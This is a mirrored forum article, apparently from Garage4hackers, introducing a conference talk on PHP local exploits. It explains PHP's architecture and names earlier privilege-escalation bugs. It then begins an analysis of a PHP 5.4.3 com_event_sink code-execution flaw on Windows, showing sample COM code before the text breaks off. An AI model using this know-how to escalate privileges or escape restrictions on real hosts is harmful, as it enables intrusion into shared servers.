<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xmlns:fb="http://www.facebook.com/2008/fbml" dir="ltr" lang="en">

<!-- Mirrored from garage4hackers.com/content.php?r=133-Web-App-Remote-Code-Execution-Via-Scripting-Engines-Part-1-Local-Exploits-PHP-0-day by HTTraQt Website Copier/1.x [Karbofos 2012-2017] Sun, 22 Mar 2020 10:48:53 GMT -->
<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=ISO-8859-1" /><!-- /Added by HTTrack -->
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta id="e_vb_meta_bburl" name="vb_meta_bburl" content="index.html" />
<base  /><!--[if IE]></base><![endif]-->
<meta name="generator" content="vBulletin 4.2.1" />
<meta http-equiv="X-UA-Compatible" content="IE=9" />

	<link rel="Shortcut Icon" href="favicon.ico" type="image/x-icon" />


		<meta name="keywords" content="" />
		<meta name="description" content="php local attacks security architecture remote escalation exploit common issues" />



	<meta property="fb:app_id" content="170793809601191" />
<meta property="og:site_name" content="Garage4hackers Forum" />
<meta property="og:description" content="php local attacks security architecture remote escalation exploit common issues" />
<meta property="og:url" content="contentc904.html?r=133-Web-App-Remote-Code-Execution-Via-Scripting-Engines-Part-1-Local-Exploits-PHP-0-day" />
<meta property="og:type" content="article" />




	
		<script type="text/javascript" src="../yui.yahooapis.com/comboaa66?2.9.0/build/yuiloader-dom-event/yuiloader-dom-event.js&amp;2.9.0/build/connection/connection-min.js"></script>
	

<script type="text/javascript">
<!--
	if (typeof YAHOO === 'undefined') // Load ALL YUI Local
	{
		document.write('<script type="text/javascript" src="clientscript/yui/yuiloader-dom-event/yuiloader-dom-event6719.html?v=421"><\/script>');
		document.write('<script type="text/javascript" src="clientscript/yui/connection/connection-min6719.html?v=421"><\/script>');
		var yuipath = 'clientscript/yui';
		var yuicombopath = '';
		var remoteyui = false;
	}
	else	// Load Rest of YUI remotely (where possible)
	{
		var yuipath = '../external.html?link=http://yui.yahooapis.com/2.9.0/build';
		var yuicombopath = '../external.html?link=http://yui.yahooapis.com/combo';
		var remoteyui = true;
		if (!yuicombopath)
		{
			document.write('<script type="text/javascript" src="../yui.yahooapis.com/2.9.0/build/connection/connection-min6719.js?v=421"><\/script>');
		}
	}
	var SESSIONURL = "";
	var SECURITYTOKEN = "guest";
	var IMGDIR_MISC = "images/misc";
	var IMGDIR_BUTTON = "images/buttons";
	var vb_disable_ajax = parseInt("0", 10);
	var SIMPLEVERSION = "421";
	var BBURL = "index.html";
	var LOGGEDIN = 0 > 0 ? true : false;
	var THIS_SCRIPT = "vbcms";
	var RELPATH = "contentc904.html?r=133-Web-App-Remote-Code-Execution-Via-Scripting-Engines-Part-1-Local-Exploits-PHP-0-day";
	var PATHS = {
		forum : "",
		cms   : "",
		blog  : ""
	};
	var AJAXBASEURL = "index.html";
// -->
</script>
<script type="text/javascript" src="clientscript/vbulletin-core6719.js?v=421"></script>



	<link rel="alternate" type="application/rss+xml" title="Garage4hackers Forum RSS Feed" href="external9476.php?type=RSS2" />
	



	<link rel="stylesheet" type="text/css" href="css30f2.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=bbcode.css,editor.css,popupmenu.css,reset-fonts.css,vbulletin.css,vbulletin-chrome.css,vbulletin-formcontrols.css," />

	<!--[if lt IE 8]>
	<link rel="stylesheet" type="text/css" href="css.php?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=popupmenu-ie.css,vbulletin-ie.css,vbulletin-chrome-ie.css,vbulletin-formcontrols-ie.css,editor-ie.css" />
	<![endif]-->


    
        <link rel="alternate" type="application/rss+xml" title="Garage4hackers Forum - CMS RSS Feed" href="externalbc09.php?do=rss&amp;type=newcontent&amp;sectionid=1&amp;days=120&amp;count=10" />
    
    <title>Garage4hackers Forum - Web-App Remote Code Execution Via Scripting Engines Part -1: Local Exploits PHP 0-day</title>
	
		<link rel="stylesheet" type="text/css" href="css6862.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=widgets.css,vbcms.css,postbit-lite.css,postlist.css,lightbox.css,overlay.css,tagcloud.css," />
	
    <!--[if lt IE 8]>
        <link rel="stylesheet" type="text/css" href="css.php?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=vbcms-ie.css,postbit-lite-ie.css,postlist-ie.css" />
    <![endif]-->
    <!--[if lt IE 7]>
	<script type="text/javascript">
		window.LESS_THAN_IE7 = true;
	</script>
    <![endif]-->
	<script type="text/javascript" src="clientscript/vbulletin_overlay6719.html?v=421"></script>
	<script type="text/javascript" src="clientscript/vbulletin_cms6719.html?v=421"></script>
	<script type="text/javascript" src="clientscript/vbulletin_ajax_htmlloader6719.js?v=421">
    </script>
    <link rel="stylesheet" type="text/css" href="css657d.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=additional.css" />

</head>
<body style="text-align:left">
<div class="above_body"> <!-- closing tag is in template navbar -->
<div id="header" class="floatcontainer doc_header">
	<div><a name="top" href="forum.html" class="logo-image"><img src="images/misc/vbulletin4_logo.html" alt="Garage4hackers Forum" /></a></div>
	<div id="toplinks" class="toplinks">
		
			<ul class="nouser">
			
				<li><a href="register.html" rel="nofollow">Register</a></li>
			
				<li><a rel="help" href="faq.html">Help</a></li>
				<li>
			<script type="text/javascript" src="clientscript/vbulletin_md56719.html?v=421"></script>
			<form id="navbar_loginform" action="../external.html?link=http://garage4hackers.com/login.php?do=login" method="post" onsubmit="md5hash(vb_login_password, vb_login_md5password, vb_login_md5password_utf, 0)">
				<fieldset id="logindetails" class="logindetails">
					<div>
						<div>
					<input type="text" class="textbox default-value" name="vb_login_username" id="navbar_username" size="10" accesskey="u" tabindex="101" value="User Name" />
					<input type="password" class="textbox" tabindex="102" name="vb_login_password" id="navbar_password" size="10" />
					<input type="text" class="textbox default-value" tabindex="102" name="vb_login_password_hint" id="navbar_password_hint" size="10" value="Password" style="display:none;" />
					<input type="submit" class="loginbutton" tabindex="104" value="Log in" title="Enter your username and password in the boxes provided to login, or click the 'register' button to create a profile for yourself." accesskey="s" />
						</div>
					</div>
				</fieldset>
				<div id="remember" class="remember">
					<label for="cb_cookieuser_navbar"><input type="checkbox" name="cookieuser" value="1" id="cb_cookieuser_navbar" class="cb_cookieuser_navbar" accesskey="c" tabindex="103" /> Remember Me?</label>
				</div>

				<input type="hidden" name="s" value="" />
				<input type="hidden" name="securitytoken" value="guest" />
				<input type="hidden" name="do" value="login" />
				<input type="hidden" name="vb_login_md5password" />
				<input type="hidden" name="vb_login_md5password_utf" />
			</form>
			<script type="text/javascript">
			YAHOO.util.Dom.setStyle('navbar_password_hint', "display", "inline");
			YAHOO.util.Dom.setStyle('navbar_password', "display", "none");
			vB_XHTML_Ready.subscribe(function()
			{
			//
				YAHOO.util.Event.on('navbar_username', "focus", navbar_username_focus);
				YAHOO.util.Event.on('navbar_username', "blur", navbar_username_blur);
				YAHOO.util.Event.on('navbar_password_hint', "focus", navbar_password_hint);
				YAHOO.util.Event.on('navbar_password', "blur", navbar_password);
			});
			
			function navbar_username_focus(e)
			{
			//
				var textbox = YAHOO.util.Event.getTarget(e);
				if (textbox.value == 'User Name')
				{
				//
					textbox.value='';
					textbox.style.color='#000000';
				}
			}

			function navbar_username_blur(e)
			{
			//
				var textbox = YAHOO.util.Event.getTarget(e);
				if (textbox.value == '')
				{
				//
					textbox.value='User Name';
					textbox.style.color='#777777';
				}
			}
			
			function navbar_password_hint(e)
			{
			//
				var textbox = YAHOO.util.Event.getTarget(e);
				
				YAHOO.util.Dom.setStyle('navbar_password_hint', "display", "none");
				YAHOO.util.Dom.setStyle('navbar_password', "display", "inline");
				YAHOO.util.Dom.get('navbar_password').focus();
			}

			function navbar_password(e)
			{
			//
				var textbox = YAHOO.util.Event.getTarget(e);
				
				if (textbox.value == '')
				{
					YAHOO.util.Dom.setStyle('navbar_password_hint', "display", "inline");
					YAHOO.util.Dom.setStyle('navbar_password', "display", "none");
				}
			}
			</script>
				</li>
				
					<li id="fb_headerbox" class="hidden">

	<a id="fb_loginbtn" href="#"><img src="images/misc/facebook_login.html" alt="The Facebook Platform" /></a>

</li>

				
			</ul>
		
	</div>
	<div class="ad_global_header">
		 
		 
	</div>
	<hr />
</div>
<div id="navbar" class="navbar">
	<ul id="navtabs" class="navtabs floatcontainer">
		
		
	
		<li  id="vbtab_whatsnew">
			<a class="navtab" href="activity.html">What's New?</a>
		</li>
		
		

	
		<li class="selected" id="vbtab_cms">
			<a class="navtab" href="content.html">Articles</a>
		</li>
		
		
			<ul class="floatcontainer">
				
					
						
							<li id=""><a href="content5ee7.html?r=1-home">Home</a></li>
						
					
				
			</ul>
		

	
		<li  id="vbtab_forum">
			<a class="navtab" href="forum.html">Forum</a>
		</li>
		
		

	
		<li  id="vbtab_blog">
			<a class="navtab" href="blog.html">Blogs</a>
		</li>
		
		

	
		<li  id="tab_nja4_357">
			<a class="navtab" href="pages7b82.html?pageid=2">G4H Team</a>
		</li>
		
		

	
		<li  id="tab_nta0_579">
			<a class="navtab" href="pages8782.html?pageid=3">IRC</a>
		</li>
		
		

	
		<li  id="tab_nta0_442">
			<a class="navtab" href="pagesdbe0.html?pageid=4">Ranchoddas</a>
		</li>
		
		

		<li>
            <a class="navtab" href="pages.html">Events and Conferences</a></li>
	</ul>
	
		<div id="globalsearch" class="globalsearch">
			<form action="../external.html?link=http://garage4hackers.com/search.php?do=process" method="post" id="navbar_search" class="navbar_search">
				
				<input type="hidden" name="securitytoken" value="guest" />
				<input type="hidden" name="do" value="process" />
				<span class="textboxcontainer"><span><input type="text" value="" name="query" class="textbox" tabindex="99"/></span></span>
				<span class="buttoncontainer"><span><input type="image" class="searchbutton" src="images/buttons/search.html" name="submit" onclick="document.getElementById('navbar_search').submit;" tabindex="100"/></span></span>
			</form>
			<ul class="navbar_advanced_search">
				<li><a href="search.html" accesskey="4">Advanced Search</a></li>
				
			</ul>
		</div>
	
</div>
</div><!-- closing div for above_body -->

<div class="body_wrapper">
<div id="breadcrumb" class="breadcrumb">
	<ul class="floatcontainer">
		<li class="navbithome"><a href="content.html" accesskey="1"><img src="images/misc/navbit-home.html" alt="Home" /></a></li>
		
	<li class="navbit"><a href="content.html">Home</a></li>

	<li class="navbit"><a href="contentc520.html?r=163-exploitation-techniques">Exploitation Techniques</a></li>

		
	<li class="navbit lastnavbit"><span>Web-App Remote Code Execution Via Scripting Engines Part -1: Local Exploits PHP 0-day</span></li>

	</ul>
	<hr />
</div>


<div style="width:728px; margin:0 auto; padding-bottom:1em">
<script type="text/javascript"><!--
google_ad_client = "ca-pub-6847984837250662";
google_ad_host = "ca-host-pub-2606800903002383";
google_ad_width = 728;
google_ad_height = 15;
google_ad_format = "728x15_0ads_al_s";
google_ad_channel = "";
google_color_border = "";
google_color_bg = "";
google_color_link = "";
google_color_text = "";
google_color_url = "";
google_ui_features = "rc:6";
//-->
</script>
<script type="text/javascript"
  src="../pagead2.googlesyndication.com/pagead/show_ads.js">
</script>
</div>

<div id="ad_global_below_navbar"><script async src="../pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<!-- garage1 -->
<ins class="adsbygoogle"
     style="display:inline-block;width:728px;height:90px"
     data-ad-client="ca-pub-6847984837250662"
     data-ad-slot="4036513682"></ins>
<script>
(adsbygoogle = window.adsbygoogle || []).push({});
</script></div>


	<form action="../external.html?link=http://garage4hackers.com/profile.php?do=dismissnotice" method="post" id="notices" class="notices">
		<input type="hidden" name="do" value="dismissnotice" />
		<input type="hidden" name="s" value="" />
		<input type="hidden" name="securitytoken" value="guest" />
		<input type="hidden" id="dismiss_notice_hidden" name="dismiss_noticeid" value="" />
		<input type="hidden" name="url" value="" />
		<ol>
			<li class="restore" id="navbar_notice_2">
	
	<html>
<h2>
The forum is <a href="showthread1180.html?t=7049&amp;p=14985#post14985">frozen forever</a> - but it won't die; it'll stay for long in search engine results and we hope it would keep helping newbies in some way or other - cheers! 


</h2>

<!-- Mirrored from garage4hackers.com/content.php?r=133-Web-App-Remote-Code-Execution-Via-Scripting-Engines-Part-1-Local-Exploits-PHP-0-day by HTTraQt Website Copier/1.x [Karbofos 2012-2017] Sun, 22 Mar 2020 10:48:53 GMT -->
</html>
</li>
		</ol>
	</form>



<div class="vbcms_content">
<div id="doc3" class="yui-tvb-r3">
	<div id="bd">
		<div id="yui-main">
			<div class="yui-b">
				<div class="yui-gf">
					<div class="yui-u first yui-panel">
						<ul class="list_no_decoration widget_list" id="widgetlist_column1">
<li><script type="text/javascript">
<!--
	var IMGDIR_MISC = "images/misc";
	var vb_disable_ajax = parseInt("0", 10);

        /* Start Sections Widget Configuration */
        vbGlobal_SHOW_ALL_TREE_ELEMENTS_THRESHOLD = parseInt("5");
        /* End Seections Widget Configuration */
// -->
</script>
<script type="text/javascript">
<!--
	document.write('<script type="text/javascript" src="' + yuipath + '/treeview/treeview-min.js"></script>');
	loadVbCss(yuipath + '/treeview/assets/skins/sam/treeview.css');
//-->
</script>
<!-- end treeview css -->

<!-- custom treeview styles defined at template: headinclude -->

<!-- END VB Tree-Menu Implementation of YUI TreeView -->
<div class="cms_widget">
	<div class="block">
		<div class="cms_widget_header">
			<h3><img src="images/cms/sections.html" alt="" /> Menu</h3>
		</div>
		<div class="cms_widget_content widget_content">
			<div class="vb-tree-menu">
				<ul >
<li><a href="contentfbb6.html?r=5-g4h-tutorial-and-research-papers" title="G4H Tutorial and Papers">G4H Tutorial and Papers</a>
</li>
<li><a href="content842d.html?r=4-g4h-tools-and-scripts" title="G4H Tools and Scripts">G4H Tools and Scripts</a>
</li>
<li><a href="content8f5d.html?r=2-garage4hackers-exploits" title="G4H Exploits">G4H Exploits</a>
</li>
<li><a href="content7820.html?r=107-ctf-amp-meet-writeups" title="CTF &amp; Meet Writeups">CTF &amp; Meet Writeups</a>
</li>
<li><a href="content0b4f.html?r=128-google-vulnerabilities" title="Google Hall of Fame">Google Hall of Fame</a>
</li>
<li><a href="contentf20a.html?r=134-teensy" title="Teensy">Teensy</a>
</li>
<li><a href="content93b9.html?r=136-webapp-exploits" title="Bug Bounty Listing">Bug Bounty Listing</a>
</li>
<li><a href="contentdb2e.html?r=151-web-application-security" title="Web Application Security">Web Application Security</a>
</li>
<li><a href="contentc520.html?r=163-exploitation-techniques" title="Exploitation Techniques">Exploitation Techniques</a>
</li>
<li><a href="content90cc.html?r=172-ranchoddas-webcast-recording" title="RWS Webcast Recording">RWS Webcast Recording</a>
</li>
<li><a href="contente989.html?r=179-blogs" title="Blogs">Blogs</a>
</li></ul>
 
			</div>
				<noscript>
					<div class="cms_widget_sectionnav">
						<div class="cms_widget_sectionnav_page">
							
								
									<div class="main_menuitem" style="text-indent:20px">
								
								<a href="contentfbb6.html?r=5-g4h-tutorial-and-research-papers">G4H Tutorial and Papers</a></div>
							
								
									<div class="main_menuitem" style="text-indent:20px">
								
								<a href="content842d.html?r=4-g4h-tools-and-scripts">G4H Tools and Scripts</a></div>
							
								
									<div class="main_menuitem" style="text-indent:20px">
								
								<a href="content8f5d.html?r=2-garage4hackers-exploits">G4H Exploits</a></div>
							
								
									<div class="main_menuitem" style="text-indent:20px">
								
								<a href="content7820.html?r=107-ctf-amp-meet-writeups">CTF &amp; Meet Writeups</a></div>
							
								
									<div class="main_menuitem" style="text-indent:20px">
								
								<a href="content0b4f.html?r=128-google-vulnerabilities">Google Hall of Fame</a></div>
							
								
									<div class="main_menuitem" style="text-indent:20px">
								
								<a href="contentf20a.html?r=134-teensy">Teensy</a></div>
							
								
									<div class="main_menuitem" style="text-indent:20px">
								
								<a href="content93b9.html?r=136-webapp-exploits">Bug Bounty Listing</a></div>
							
								
									<div class="main_menuitem" style="text-indent:20px">
								
								<a href="contentdb2e.html?r=151-web-application-security">Web Application Security</a></div>
							
								
									<div class="active_menuitem" style="text-indent:20px">
								
								<a href="contentc520.html?r=163-exploitation-techniques">Exploitation Techniques</a></div>
							
								
									<div class="main_menuitem" style="text-indent:20px">
								
								<a href="content90cc.html?r=172-ranchoddas-webcast-recording">RWS Webcast Recording</a></div>
							
								
									<div class="main_menuitem" style="text-indent:20px">
								
								<a href="contente989.html?r=179-blogs">Blogs</a></div>
							
						</div>
					</div>
				</noscript>			
		</div>
	</div>
</div>

<script type="text/javascript">
	initVbTreeMenus(false);
</script></li>
</ul>
					</div>
					<div class="yui-u yui-panel">
						<ul class="list_no_decoration widget_list" id="widgetlist_column2">
<li><!-- styles defined in template: headinclude -->



<div class="article_width" id="article_content">
	<div class="title">
                <h1 class="article_title cms_article_title"><span>Web-App Remote Code Execution Via Scripting Engines Part -1: Local Exploits PHP 0-day</span>
                        
		</h1>
	</div>
	<div class="article_author_date_comment_container">
                
		<div class="fullwidth">
			
				<div>
<fb:like href="contentc904.html?r=133-Web-App-Remote-Code-Execution-Via-Scripting-Engines-Part-1-Local-Exploits-PHP-0-day" font="tahoma" layout="standard" show_faces="false" width="260" action="../external.html?link=http://garage4hackers.com/like" colorscheme="light"></fb:like></div>
			
			
				<div class="article_username_container">
					by <div class="popupmenu memberaction">
	<a class="username offline popupctrl" href="membere81f.html?u=8" title="fb1h2s is offline"><strong>fb1h2s</strong></a>
	<ul class="popupbody popuphover memberaction_body">
		<li class="left">
			<a href="membere81f.html?u=8" class="siteicon_profile">
				View Profile
			</a>
		</li>
		
		<li class="right">
			<a href="search9898.html?do=finduser&amp;userid=8&amp;contenttype=vBForum_Post&amp;showposts=1" class="siteicon_forum" rel="nofollow">
				View Forum Posts
			</a>
		</li>
		
		
		<li class="left">
			<a href="privatedce0.html?do=newpm&amp;u=8" class="siteicon_message" rel="nofollow">
				Private Message
			</a>
		</li>
		
		
		
		<li class="right">
			<a href="bloge81f.html?u=8" class="siteicon_blog" rel="nofollow">
				View Blog Entries
			</a>
		</li>
		
		
		
		<li class="left">
			<a href="index.html" class="siteicon_homepage">
				Visit Homepage
			</a>
		</li>
		
		
		
		<li class="right">
			<a href="list2c25.html?r=author/8-fb1h2s" class="siteicon_article" rel="nofollow">
				View Articles
			</a>
		</li>
		

		

		
		
	</ul>
</div>
				</div>
			
                        
                                <div class="article_rating_container">
                                        <div class="popupmenu cmsratingmenu" id="cmsrating">
                                                <h6><a class="popupctrl" href="javascript://" id="cmsrating_current"><img class="inlineimg" src="images/rating/rating-15_1.html" alt="" /></a></h6>
                                                <form action="../external.html?link=http://garage4hackers.com/content.php?133/rate" method="post" id='cms_cmsrate_form'>
                                                        <ul class="popupbody popuphover">
                                                                
                                                                        <li><label for="r5"><span class="rating5 cmsrating right">
                                                                                <input type="radio" name="vote" value="5" id="r5"  tabindex="1" /> Excellent
                                                                        </span></label></li>
                                                                        <li><label for="r4"><span class="rating4 cmsrating right">
                                                                                <input type="radio" name="vote" value="4" id="r4"  tabindex="1" /> Good
                                                                        </span></label></li>
                                                                        <li><label for="r3"><span class="rating3 cmsrating right">
                                                                                <input type="radio" name="vote" value="3" id="r3"  tabindex="1" /> Average
                                                                        </span></label></li>
                                                                        <li><label for="r2"><span class="rating2 cmsrating right">
                                                                                <input type="radio" name="vote" value="2" id="r2"  tabindex="1" /> Bad
                                                                        </span></label></li>
                                                                        <li><label for="r1"><span class="rating1 cmsrating right">
                                                                                <input type="radio" name="vote" value="1" id="r1"  tabindex="1" /> Terrible
                                                                        </span></label></li>
                                                                        <li class="formsubmit"><input type="submit" class="button" value="Vote Now" tabindex="1" /></li>
                                                                
                                                        </ul>
                                                        <input type="hidden" name="s" value="" />
                                                        <input type="hidden" name="securitytoken" value="guest" />
                                                </form>
                                                <script type="text/javascript" src="clientscript/cms_ajax_rate6719.html?v=421"></script>
                                                <script type="text/javascript">
                                                <!--
                                                        var nodeid = 133;
                                                        vB_AJAX_CMSRate_Init('cms_cmsrate_form');
                                                //-->
                                                </script>
                                        </div>
                                </div>
                        
                        <div class="cms_clear"></div>
                        
				<div class=" article_username_container ">
					
						
							Published on 08-20-2012  07:22 PM
						
					
					
						&nbsp;
						&nbsp;
					
					
						&nbsp;Number of Views: 8808
						&nbsp;
					
				</div>
			
                       
                        <div class="article_rating_container">
                            	<a href="contentc904.html?r=133-Web-App-Remote-Code-Execution-Via-Scripting-Engines-Part-1-Local-Exploits-PHP-0-day#comments"  rel="nofollow"><span id="comments_top_count">1</span> <span id="comments_top_text"> Comment</span></a>
				<img src="images/misc/comment.html" alt="Comments" border="0" />
                        </div>
                       
		</div>
	</div>
    
    <div class="clear"></div>
	<div class="article cms_clear restore postcontainer"><img src="../external.html?link=http://www.is-ra.org/c0c0n/404" border="0" alt="" /><br />
This would be part-1 one of my <a href="../external.html?link=http://is-ra.org/c0c0n/speakers.html" target="_blank">C0C0n</a> talk , where I demonstrated few PHP 0-days, Local and Remote . The entire concept of the talk was demonstrating attacks on WebApplications via scripting engines.<br />
<br />
In a common Webapp test we manipulates Input , that a common end user controls and check for responses from the app. But since these data passed are processed by the PHP,ASP engines that are used to build these apps. We were fuzzing and trying to figure out issues in these engines that could be attacked by common user. My talk had two parts Local Attacks and Remote Attacks. Local attacks I demonstrated ways to do privilege escalation exploiting PHP and in Remote Attacks we mapped PHP functions that took arguments from remote users like File processing and Image Processing functions and demonstrated ways to exploit them.The entire presentation concentrated on PHP core Bugs.  <br />
<br />
 <br />
Current  post would be on PHP local attacks only [The first part of the Talk]  , since once of these issue is already out, it's time to blog. <br />
<br />
I would put down some intro on PHP architecture, the history of PHP local attacks and exploits that were commonly used in the wild for privilege escalation followed by my our own 0-days [The way how I delivered my Talk]. <br />
<br />
<br />
<br />
<i><u>Note: The images put up here are not created by me, at the time of making PPTs I downloaded them via google images, and now I have no clue whom to give credit. <br />
</u></i><br />
<br />
Web Application How Stuffs Work. <br />
<br />
1) User[browser] Send Inputs to Webapp -<br />
2) Http Server catches and<br />
3) Passes it to Web App --&gt;<br />
4) WebApp send it to Scripting engine to process it.<br />
<br />
<br />
<img src="attachment91f7.jpg?attachmentid=481&amp;d=1345470762" border="0" alt=""  style="float: CONFIG" /><br />
<br />
<u>PHP Architecture  : <br />
</u><br />
These digrams are good enough to explain php Architecture in Detail, instead of me writing about them in detail. <br />
<br />
1) <br />
<img src="attachment5911.jpg?attachmentid=482&amp;d=1345470762" border="0" alt=""  style="float: CONFIG" /><br />
<b><u><br />
PHP + Apache Security Architecture :</u></b><br />
<br />
1) So if we could execute code in context of PHP , you would be able to break out many restrictions. <br />
2) Should be able to get shell access to hardned PHP Hosts.<br />
3) Shared hosting Windows servers are affected the most.<br />
4) These sort of bugs are rated 10/10 in a CVE score by PHP.   <br />
<br />
<img src="attachment7fa4.jpg?attachmentid=483&amp;d=1345470762" border="0" alt=""  style="float: CONFIG" /><br />
<br />
<u><b>Why PHP Local Exploits.<br />
</b></u><br />
1) For Privilege Escalation <br />
2) Code Execution in Protected Environments <br />
3) Bypassing Security Restrictions <br />
<br />
<b><u>History of PHP Local Exploits for Bug Hunters:<br />
</u></b><br />
1) <a href="../external.html?link=http://www.garage4hackers.com/f37/private-symlink-php-exploit-tutorial-silic0n-509.html" target="_blank">PHP Symlink Exploit    </a><br />
2) PHP Nginx Exploit<br />
3)  _php_stream_scandir<br />
4)CVE-2011-3268 [crypt function]<br />
<br />
The best of PHP bug hunts were done by <a href="../external.html?link=http://developers.slashdot.org/story/10/06/04/1540241/month-of-php-security-finds-60-bugs" target="_blank">i0nic and team </a> for there &quot;Month of PHP Security&quot; in <a href="../external.html?link=http://php-security.org/MOPB/index.html" target="_blank">2007</a> and <a href="../external.html?link=http://www.php-security.org/" target="_blank">2010  </a>. About 60 security issues were identified and few POCs were released. <br />
<br />
Or you coud Browse this well organized archive . <a href="../external.html?link=http://www.cvedetails.com/vendor/74/PHP.html" target="_blank">PHP : Products and vulnerabilities</a><br />
<br />
In April 2012 I found few local security issues , that were added to CoCon CFP , which later was identified by <a href="../external.html?link=http://cond.psychodela.pl/" target="_blank">condis</a> <a href="../external.html?link=http://cxsecurity.com/issue/WLB-2012050163" target="_blank">PHP &lt;= 5.4.3 (com_event_sink) Code Execution Proof of Concept - CXSecurity WLB</a> independently . Now that this issue is <a href="../external.html?link=https://bugs.php.net/bug.php?id=62474" target="_blank">Public</a> , I will put down my analysis notes on getting code execution on this bug. Current bug only affect PHP Windows. <br />
<br />
<u><b>PHP 5.4.3 Com_event_sink 0-day:<br />
</b></u><br />
<br />
<b>The Vulnerable Function:<br />
</b><br />
PHP Provides a module to interact with COM and .Net (Windows). In that com_event_sink is used the following way.<br />
<br />
It allows users to call a COM instance , in current case [IE] and interact with it. <br />
Note: This feature is handy if the server you have access has disallowed other mechanism to download files to it like .<br />
<br />
The following code will open an IE instance and download the webpage <a href="../external.html?link=http://www.google.com/" target="_blank">Google</a>. The function com_event_sink takes three arguments.<br />
<br />
1)  --&gt; $ie = new COM(&quot;InternetExplorer.Application&quot;);<br />
<br />
     Address of the Com object to be interacted <br />
<br />
2) --&gt; Sink Object<br />
<br />
3) -- &gt; Sink Interface<br />
<br />
 com_event_sink($ie, $sink, &quot;DWebBrowserEvents2&quot;);<br />
<br />
<div class="bbcode_container">
	<div class="bbcode_description">PHP Code:</div>
	<div class="bbcode_code"style="height:360px;"><code><code><span style="color: #000000">
<span style="color: #0000BB">&lt;?php<br /></span><span style="color: #007700">class&nbsp;</span><span style="color: #0000BB">IEEventSinker&nbsp;</span><span style="color: #007700">{<br />&nbsp;&nbsp;&nbsp;&nbsp;var&nbsp;</span><span style="color: #0000BB">$terminated&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">false</span><span style="color: #007700">;<br /><br />&nbsp;&nbsp;&nbsp;function&nbsp;</span><span style="color: #0000BB">ProgressChange</span><span style="color: #007700">(</span><span style="color: #0000BB">$progress</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">$progressmax</span><span style="color: #007700">)&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;</span><span style="color: #DD0000">"Download&nbsp;progress:&nbsp;</span><span style="color: #0000BB">$progress</span><span style="color: #DD0000">&nbsp;/&nbsp;</span><span style="color: #0000BB">$progressmax</span><span style="color: #DD0000">\n"</span><span style="color: #007700">;<br />&nbsp;&nbsp;&nbsp;&nbsp;}<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;function&nbsp;</span><span style="color: #0000BB">DocumentComplete</span><span style="color: #007700">(&amp;</span><span style="color: #0000BB">$dom</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">$url</span><span style="color: #007700">)&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;</span><span style="color: #DD0000">"Document&nbsp;</span><span style="color: #0000BB">$url</span><span style="color: #DD0000">&nbsp;complete\n"</span><span style="color: #007700">;<br />&nbsp;&nbsp;&nbsp;&nbsp;}<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;function&nbsp;</span><span style="color: #0000BB">OnQuit</span><span style="color: #007700">()&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;</span><span style="color: #DD0000">"Quit!\n"</span><span style="color: #007700">;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">$this</span><span style="color: #007700">-&gt;</span><span style="color: #0000BB">terminated&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">true</span><span style="color: #007700">;<br />&nbsp;&nbsp;&nbsp;&nbsp;}<br />}<br /></span><span style="color: #0000BB">$ie&nbsp;</span><span style="color: #007700">=&nbsp;new&nbsp;</span><span style="color: #0000BB">COM</span><span style="color: #007700">(</span><span style="color: #DD0000">"InternetExplorer.Application"</span><span style="color: #007700">);<br /></span><span style="color: #FF8000">//&nbsp;note&nbsp;that&nbsp;you&nbsp;don't&nbsp;need&nbsp;the&nbsp;&amp;&nbsp;for&nbsp;PHP&nbsp;5!<br /></span><span style="color: #0000BB">$sink&nbsp;</span><span style="color: #007700">=&nbsp;new&nbsp;</span><span style="color: #0000BB">IEEventSinker</span><span style="color: #007700">();<br /></span><span style="color: #0000BB">com_event_sink</span><span style="color: #007700">(</span><span style="color: #0000BB">$ie</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">$sink</span><span style="color: #007700">,&nbsp;</span><span style="color: #DD0000">"DWebBrowserEvents2"</span><span style="color: #007700">);<br /></span><span style="color: #0000BB">$ie</span><span style="color: #007700">-&gt;</span><span style="color: #0000BB">Visible&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">true</span><span style="color: #007700">;<br /></span><span style="color: #0000BB">$ie</span><span style="color: #007700">-&gt;</span><span style="color: #0000BB">Navigate</span><span style="color: #007700">(</span><span style="color: #DD0000">"http://www.google.com"</span><span style="color: #007700">);<br />while(!</span><span style="color: #0000BB">$sink</span><span style="color: #007700">-&gt;</span><span style="color: #0000BB">terminated</span><span style="color: #007700">)&nbsp;{<br />&nbsp;&nbsp;</span><span style="color: #0000BB">com_message_pump</span><span style="color: #007700">(</span><span style="color: #0000BB">4000</span><span style="color: #007700">);<br />}<br /></span><span style="color: #0000BB">$ie&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">null</span><span style="color: #007700">;<br /></span><span style="color: #0000BB">?&gt;</span>
</span>
</code></code></div>
</div><b>The Bug: <br />
</b><br />
<br />
The first argument is the adress of the COM object to load and it's controlled by the user. And no validation is done on the address, and this is address is directly used. [Very Bad logic]<br />
<div class="bbcode_container">
	<div class="bbcode_description">PHP Code:</div>
